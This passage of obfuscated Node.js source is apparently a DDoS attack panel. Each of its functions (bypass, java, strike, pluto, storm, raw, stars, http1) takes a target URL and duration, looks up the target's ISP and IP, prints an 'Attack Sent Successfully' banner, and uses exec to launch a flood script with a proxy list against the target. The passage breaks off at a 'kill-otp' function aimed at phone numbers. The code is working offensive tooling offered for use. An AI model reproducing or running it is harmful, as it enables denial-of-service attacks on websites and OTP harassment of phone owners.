    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x519f81 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x2689d6 + " [1;37m]\n[1;37m      Methods:    [[1m[36m bypass [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x5279b6.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x5279b6.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x5279b6.query + " [1;37m]\n");
  } catch (_0x5a547b) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x4cc2ee = path.join(__dirname, '/lib/cache/9');
  exec("node " + _0x4cc2ee + " " + _0x519f81 + " " + _0x2689d6 + " 32 10 proxy.txt");
  sigma();
}
;
async function java(_0x490818) {
  if (_0x490818.length < 0x3) {
    console.log("Example: .java <target> <port>  <duration>\njava https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x1f9ac2, _0x56e5a3, _0x465c19] = _0x490818;
  try {
    const _0x307e1c = new url.URL(_0x1f9ac2);
    const _0x59fa9f = _0x307e1c.hostname;
    const _0x2d0560 = await axios.get("http://ip-api.com/json/" + _0x59fa9f + '?fields=isp,query,as');
    const _0x5da29a = _0x2d0560.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x1f9ac2 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x465c19 + " [1;37m]\n[1;37m      Methods:    [[1m[36m java [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x5da29a.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x5da29a.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x5da29a.query + " [1;37m]\n");
  } catch (_0x295d4d) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x2b4729 = path.join(__dirname, "/lib/cache/10");
  exec("node " + _0x2b4729 + " " + _0x1f9ac2 + " " + _0x465c19 + " 32 10 proxy.txt");
  sigma();
}
;
async function strike(_0x50f174) {
  if (_0x50f174.length < 0x3) {
    console.log("Example: .strike <target> <port>  <duration>\nstrike https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x3ae811, _0x14f688, _0x3f4590] = _0x50f174;
  try {
    const _0x1bbf37 = new url.URL(_0x3ae811);
    const _0x1c8a8d = _0x1bbf37.hostname;
    const _0x37cbb3 = await axios.get("http://ip-api.com/json/" + _0x1c8a8d + "?fields=isp,query,as");
    const _0xf392f7 = _0x37cbb3.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x3ae811 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x3f4590 + " [1;37m]\n[1;37m      Methods:    [[1m[36m strike [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0xf392f7.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0xf392f7.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0xf392f7.query + " [1;37m]\n");
  } catch (_0x16f3db) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x291c5c = path.join(__dirname, "/lib/cache/11");
  exec("node " + _0x291c5c + " GET " + _0x3ae811 + " " + _0x3f4590 + " 10 90 proxy.txt --full");
  sigma();
}
;
async function pluto(_0x496eba) {
  if (_0x496eba.length < 0x3) {
    console.log("Example: .pluto <target> <port>  <duration>\npluto https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0xa2e772, _0x33cfe8, _0x4f524a] = _0x496eba;
  try {
    const _0x1fe526 = new url.URL(_0xa2e772);
    const _0x29e17a = _0x1fe526.hostname;
    const _0x5c7001 = await axios.get("http://ip-api.com/json/" + _0x29e17a + "?fields=isp,query,as");
    const _0x5d8cc7 = _0x5c7001.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0xa2e772 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x4f524a + " [1;37m]\n[1;37m      Methods:    [[1m[36m pluto [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x5d8cc7.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x5d8cc7.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x5d8cc7.query + " [1;37m]\n");
  } catch (_0xa399f4) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x5aaea1 = path.join(__dirname, "/lib/cache/12");
  exec("node " + _0x5aaea1 + " " + _0xa2e772 + " " + _0x4f524a + " 32 10 proxy.txt");
  sigma();
}
;
async function storm(_0x367bad) {
  if (_0x367bad.length < 0x3) {
    console.log("Example: .storm <target> <port>  <duration>\nstorm https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x138eb5, _0x1d7a89, _0x21f7ba] = _0x367bad;
  try {
    const _0x3a4d23 = new url.URL(_0x138eb5);
    const _0x4e6e78 = _0x3a4d23.hostname;
    const _0x49618c = await axios.get("http://ip-api.com/json/" + _0x4e6e78 + "?fields=isp,query,as");
    const _0x8ccd65 = _0x49618c.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x138eb5 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x21f7ba + " [1;37m]\n[1;37m      Methods:    [[1m[36m storm [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x8ccd65.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x8ccd65.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x8ccd65.query + " [1;37m]\n");
  } catch (_0x34c96d) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x507345 = path.join(__dirname, "/lib/cache/13");
  exec("node " + _0x507345 + " " + _0x138eb5 + " " + _0x21f7ba + " 32 10 proxy.txt");
  sigma();
}
;
async function raw(_0x577e94) {
  if (_0x577e94.length < 0x3) {
    console.log("Example: .raw <target> <port>  <duration>\nraw https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x1b6c76, _0x2bb781, _0x267d82] = _0x577e94;
  try {
    const _0x37d5fc = new url.URL(_0x1b6c76);
    const _0x5915eb = _0x37d5fc.hostname;
    const _0x4cb9c4 = await axios.get('http://ip-api.com/json/' + _0x5915eb + "?fields=isp,query,as");
    const _0x1a3429 = _0x4cb9c4.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x1b6c76 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x267d82 + " [1;37m]\n[1;37m      Methods:    [[1m[36m raw [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x1a3429.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x1a3429.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x1a3429.query + " [1;37m]\n\n");
  } catch (_0x22a944) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x3cc23c = path.join(__dirname, "/lib/cache/14");
  exec("node " + _0x3cc23c + " " + _0x1b6c76 + " " + _0x267d82);
  sigma();
}
;
async function stars(_0x4777fb) {
  if (_0x4777fb.length < 0x3) {
    console.log("Example: .stars <target> <port>  <duration>\nflood https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x38765a, _0x5bcf50, _0x180553] = _0x4777fb;
  try {
    const _0xc5d00a = new url.URL(_0x38765a);
    const _0x411845 = _0xc5d00a.hostname;
    const _0x4ca2da = await axios.get("http://ip-api.com/json/" + _0x411845 + "?fields=isp,query,as");
    const _0xeded8f = _0x4ca2da.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x38765a + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x180553 + " [1;37m]\n[1;37m      Methods:    [[1m[36m stars [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0xeded8f.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0xeded8f.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0xeded8f.query + " [1;37m]\n");
  } catch (_0x28fa60) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0xef50d3 = path.join(__dirname, '/lib/cache/15');
  exec("node " + _0xef50d3 + " " + _0x38765a + " " + _0x180553 + " 64 10 proxy.txt");
  sigma();
}
;
async function http1(_0x52beec) {
  if (_0x52beec.length < 0x3) {
    console.log("Example: .http <target> <port>  <duration>\nhttp1 https://contoh.com 443 60");
    sigma();
    return;
  }
  const [_0x5526b7, _0x54d92b, _0x2a1f86] = _0x52beec;
  try {
    const _0x25c6c2 = new url.URL(_0x5526b7);
    const _0x2d6b26 = _0x25c6c2.hostname;
    const _0x2bc92e = await axios.get('http://ip-api.com/json/' + _0x2d6b26 + '?fields=isp,query,as');
    const _0x15599c = _0x2bc92e.data;
    console.clear();
    console.log("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀\n⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧\n⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋\n⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋\n⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀\n⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀\n⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀\n\n========================================================================\n [1;37m  Attacks Details\n[1;37m      Status:     [[1;32m Attack Sent Successfully All Server [1;37m]\n[1;37m      Host:       [[1m[36m " + _0x5526b7 + "  [1;37m]\n[1;37m      Port:       [[1m[36m 443 [1;37m]\n[1;37m      Time:       [[1m[36m " + _0x2a1f86 + " [1;37m]\n[1;37m      Methods:    [[1m[36m http1 [1;37m]\n[1;37m  Target Details\n[1;37m      ASN:        [[1m[36m " + _0x15599c.as + " [1;37m]\n[1;37m      ISP:        [[1m[36m " + _0x15599c.isp + " [1;37m]\n[1;37m      IP:        [[1m[36m " + _0x15599c.query + " [1;37m]\n");
  } catch (_0x5e49a9) {
    console.log("Oops Something Went Wrong");
    sigma();
  }
  const _0x14f8a5 = path.join(__dirname, '/lib/cache/16');
  exec("node " + _0x14f8a5 + " " + _0x5526b7 + " " + _0x2a1f86);
  sigma();
}
;
async function killOTP(_0x2c64d4) {
  if (_0x2c64d4.length < 0x2) {
    console.log("Example: kill-otp <target> <duration>\nkill-otp 628xxx 120");
    sigma();
    return;
  }
  const [_0x425aaa, _0x3dab1a] = _0x2c64d4;
  try {
    console.clear();
